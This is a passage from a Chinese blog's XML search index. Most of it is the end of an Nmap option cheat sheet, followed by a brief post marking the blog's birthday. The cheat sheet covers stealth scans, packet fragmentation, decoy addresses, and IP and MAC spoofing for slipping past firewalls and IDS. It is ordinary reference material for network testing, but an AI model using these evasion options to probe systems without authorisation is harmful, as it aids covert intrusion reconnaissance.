列表扫描，仅将指定的目标的IP列举出来，不进行主机发现</li><li>-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况</li><li>-sO: 使用IP protocol 扫描确定目标机支持的协议类型</li><li>-PO : 使用IP协议包探测对方主机是否开启</li><li>-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机</li><li>-PS/PA/PU/PY : 使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现</li><li>-sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态</li><li>-e eth0：指定使用eth0网卡进行探测</li><li>-f : –mtu <code>&lt;val&gt;</code>: 指定使用分片、指定数据包的 MTU.</li><li>-b <code>&lt;FTP relay host&gt;</code>: 使用FTP bounce scan扫描方式</li><li>-g： 指定发送的端口号</li><li>-r：不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）</li><li>-v ：表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态（推荐）</li><li>-n : 表示不进行DNS解析；</li><li>-D &lt;decoy1,decoy2[,ME],…&gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址</li><li>-R ：表示总是进行DNS解析。</li><li>-F : 快速模式，仅扫描TOP 100的端口</li><li>-S <IP_Address>: 伪装成其他 IP 地址</IP_Address></li><li>–ttl <code>&lt;val&gt;</code>: 设置 time-to-live 时间</li><li>–badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）</li><li>–dns-servers : 指定DNS服务器</li><li>–system-dns : 指定使用系统的DNS服务器</li><li>–traceroute : 追踪每个路由节点</li><li>–scanflags <code>&lt;flags&gt;</code>: 定制TCP包的flags</li><li>–top-ports <code>&lt;number&gt;</code> :扫描开放概率最高的number个端口</li><li>–port-ratio <code>&lt;ratio&gt;</code>: 扫描指定频率以上的端口。与上述–top-ports类似，这里以概率作为参数</li><li>–version-trace: 显示出详细的版本侦测过程信息</li><li>–osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）</li><li>–osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统</li><li>–data-length <code>&lt;num&gt;</code>: 填充随机数据让数据包长度达到 Num</li><li>–ip-options <code>&lt;options&gt;</code>: 使用指定的 IP 选项来发送数据包</li><li>–spoof-mac &lt;mac address/prefix/vendor name&gt; : 伪装 MAC 地址</li><li>–version-intensity <code>&lt;level&gt;</code>: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。</li><li>–version-light: 指定使用轻量侦测方式 (intensity 2)</li><li>–version-all: 尝试使用所有的probes进行侦测 (intensity 9)</li></ol><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Nmap%E7%9A%84%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-28.png" alt loading="lazy"></p><p>参考原文链接：<a href="https://www.cnblogs.com/bonelee/p/9188122.html">1</a>，<a href="https://www.cnblogs.com/liaopeng123/p/11281516.html">2</a></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My_Blog&#39;s Birthday</title>
      <link href="/posts/37e5e453/"/>
      <url>/posts/37e5e453/</url>
      
        <content type="html"><![CDATA[<p><strong>纪念诞辰</strong></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/My_Blog's Birthday/1576157953127.jpg" style="zoom:50%;" loading="lazy"><p>​                                                                                                                                       ————<strong>2020-1-8</strong></p><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
